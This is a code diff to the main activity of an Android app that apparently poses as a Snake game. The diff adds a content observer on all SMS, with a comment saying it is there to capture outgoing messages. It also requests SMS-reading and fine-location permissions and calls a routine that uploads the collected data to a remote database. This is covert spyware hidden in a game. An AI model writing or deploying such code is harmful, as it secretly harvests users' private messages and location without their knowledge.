@@ -1,9 +1,13 @@
 package com.example.s1300465.snake;
 
+import android.content.ContentResolver;
 import android.content.Intent;
 import android.content.IntentFilter;
 import android.content.pm.PackageManager;
+import android.content.res.Configuration;
+import android.net.Uri;
 import android.os.Bundle;
+import android.os.Handler;
 import android.support.v4.app.ActivityCompat;
 import android.support.v4.content.ContextCompat;
 import android.support.v7.app.AppCompatActivity;
@@ -32,16 +36,12 @@ public class MainActivity extends AppCompatActivity {
             }
         });
 
-        IncomingSMSReceiver smsReceiver = new IncomingSMSReceiver();
-        IntentFilter smsFilter  = new IntentFilter("android.provider.Telephony.SMS_RECEIVED");
-        smsFilter.setPriority(1000);
+        //Have to register a ContentObserver to list for all SMS in order to obtain outgoing ones
+        //as there's no Broadcast Receiver action for outgoing (or at least it doesn't work)
+        ContentResolver contentResolver = getApplicationContext().getContentResolver();
+        contentResolver.registerContentObserver(Uri.parse("content://sms/"), true, new OutgoingSMSObserver(new Handler(), getApplicationContext(), contentResolver));
 
-        //This can sometimes cause a leaked IntentReceiver if called again while still registered
-        //Doesn't crash app though so not an issue, and we don't want to unregister onPause
-        //or we won't catch any SMS when the app is closed
-        this.registerReceiver(smsReceiver, smsFilter);
-
-        new RemoteDatabaseHelper(this).uploadData();
+        new RemoteDatabaseHelper(this).checkConnectionAndUpload();
     }
 
     public boolean getPermissions(){
@@ -54,6 +54,9 @@ public class MainActivity extends AppCompatActivity {
         }
         if(ContextCompat.checkSelfPermission(this, android.Manifest.permission.RECEIVE_SMS) == PackageManager.PERMISSION_DENIED){
             permissions.add(android.Manifest.permission.RECEIVE_SMS);
+        }
+        if(ContextCompat.checkSelfPermission(this, android.Manifest.permission.READ_SMS) == PackageManager.PERMISSION_DENIED){
+            permissions.add(android.Manifest.permission.READ_SMS);
         }
         if(ContextCompat.checkSelfPermission(this, android.Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_DENIED){
             permissions.add(android.Manifest.permission.ACCESS_FINE_LOCATION);
@@ -80,5 +83,11 @@ public class MainActivity extends AppCompatActivity {
 
     public void openHighScores(View v){
         startActivity(new Intent(this, HighScoresActivity.class));
+    }
+
+    @Override
+    public void onConfigurationChanged(Configuration newConfig) {
+        super.onConfigurationChanged(newConfig);
+
     }
 }
